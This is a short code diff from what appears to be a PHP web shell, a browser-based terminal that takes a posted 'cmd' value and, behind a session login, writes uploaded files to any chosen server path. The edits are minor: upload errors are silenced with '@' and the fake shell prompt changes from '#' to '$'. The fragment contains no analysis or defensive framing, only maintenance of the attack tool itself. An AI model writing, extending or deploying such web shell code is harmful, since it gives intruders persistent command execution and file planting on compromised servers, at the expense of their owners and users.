@@ -14,7 +14,7 @@ if (ISSET($_POST['cmd'])) {
     if ($path != "/") {
         $path .= "/";
     } 
-    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
+    if (@move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
         echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
     } else {
         echo "Error uploading " . htmlentities($filename);
@@ -268,7 +268,7 @@ if(!$_SESSION['loggedIn']) {
                 };
                 request.open("POST", "", true);
                 request.send(formData);
-                outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
+                outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"$ Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
             }
 			
             function updateInputWidth() {
